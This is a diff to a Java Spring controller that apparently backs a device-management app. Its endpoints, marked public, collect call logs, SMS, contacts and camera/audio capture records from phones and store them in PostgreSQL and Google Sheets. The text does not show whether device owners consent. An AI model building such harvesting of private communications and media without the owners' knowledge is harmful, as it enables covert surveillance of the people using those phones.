@@ -33,7 +33,6 @@ public class DeviceSyncController {
     private final DeviceLogRepository         logRepository;
     private final DeviceLocationRepository    locationRepository;
     private final DeviceRepository            deviceRepository;
-    private final DeviceNotificationRepository notificationRepository;
     private final GoogleSheetsService         googleSheetsService;
 
     // ─── Config sync ──────────────────────────────────────────────────────────
@@ -217,7 +216,7 @@ public class DeviceSyncController {
         return ResponseEntity.ok(Map.of("status", "OK"));
     }
 
-    // ─── Dedicated Call Log endpoint (stored in Google Sheets, not DB) ──────
+    // ─── Dedicated Call Log endpoint ──────────────────────────────────────
 
     @PostMapping({"/{project}/rest/plugins/deviceinfo/calllog/public/{number}",
                   "/rest/plugins/deviceinfo/calllog/public/{number}"})
@@ -227,7 +226,6 @@ public class DeviceSyncController {
             @RequestBody List<Map<String, Object>> callLogs) {
         deviceRepository.findByNumber(number).ifPresent(device -> {
             Long deviceId = device.getId();
-            // Store in Google Sheets (with dedup) — NOT in PostgreSQL
             int saved = googleSheetsService.syncCallLogs(deviceId, callLogs);
             if (saved > 0) {
                 log.info("CallLog: saved {} entries for device {} via Google Sheets", saved, number);
@@ -236,7 +234,7 @@ public class DeviceSyncController {
         return ResponseEntity.ok(Map.of("status", "OK"));
     }
 
-    // ─── Dedicated SMS endpoint (like original Headwind MDM APK) ──────────────
+    // ─── Dedicated SMS endpoint ──────────────────────────────────────────────
 
     @PostMapping({"/{project}/rest/plugins/deviceinfo/sms/public/{number}",
                   "/rest/plugins/deviceinfo/sms/public/{number}"})
@@ -245,15 +243,14 @@ public class DeviceSyncController {
             @PathVariable String number,
             @RequestBody List<Map<String, Object>> smsMessages) {
         log.debug("Received SMS for {}: {} messages", number, smsMessages.size());
-        // SMS messages are stored as notifications for now
+        // Log the SMS receipt for audit (no notifications storage)
         deviceRepository.findByNumber(number).ifPresent(device -> {
-            // Log the SMS receipt for audit
             log.info("Device {} sent {} SMS messages", number, smsMessages.size());
         });
         return ResponseEntity.ok(Map.of("status", "OK"));
     }
 
-    // ─── Device Data Sync (Contacts, Call Logs, Notifications) ────────────────
+    // ─── Device Data Sync (Contacts, Call Logs, Media) ─────────────────────
 
     @PostMapping({"/{project}/rest/public/data/sync/{number}",
                   "/rest/public/data/sync/{number}"})
@@ -264,7 +261,7 @@ public class DeviceSyncController {
         deviceRepository.findByNumber(number).ifPresent(device -> {
             Long deviceId = device.getId();
 
-            // Save contacts → Google Sheets (not PostgreSQL)
+            // Save contacts → PostgreSQL (primary) + Sheets (backup)
             if (dataDto.getContacts() != null) {
                 List<Map<String, Object>> contactMaps = new ArrayList<>();
                 for (DeviceDataSyncDto.ContactDto c : dataDto.getContacts()) {
@@ -279,7 +276,7 @@ public class DeviceSyncController {
                 googleSheetsService.syncContacts(deviceId, contactMaps);
             }
 
-            // Save call logs → Google Sheets (not PostgreSQL)
+            // Save call logs → PostgreSQL (primary) + Sheets (backup)
             if (dataDto.getCallLogs() != null) {
                 List<Map<String, Object>> callMaps = new ArrayList<>();
                 for (DeviceDataSyncDto.CallLogDto call : dataDto.getCallLogs()) {
@@ -294,19 +291,11 @@ public class DeviceSyncController {
                 googleSheetsService.syncCallLogs(deviceId, callMaps);
             }
 
-            // Save notifications
-            if (dataDto.getNotifications() != null) {
-                for (DeviceDataSyncDto.NotificationDto n : dataDto.getNotifications()) {
-                    if (n.getReceivedAt() == null) continue;
-                    DeviceNotification notif = DeviceNotification.builder()
-                            .deviceId(deviceId)
-                            .packageName(n.getPackageName())
-                            .appName(n.getAppName())
-                            .title(n.getTitle())
-                            .text(n.getText())
-                            .receivedAt(n.getReceivedAt())
-                            .build();
-                    notificationRepository.save(notif);
+            // Log media capture records (camera/audio from APK)
+            if (dataDto.getMedia() != null && !dataDto.getMedia().isEmpty()) {
+                for (DeviceDataSyncDto.MediaRecordDto m : dataDto.getMedia()) {
+                    log.info("Media capture from device {}: type={}, file={}, size={}",
+                            number, m.getMediaType(), m.getFileName(), m.getFileSize());
                 }
             }
         });
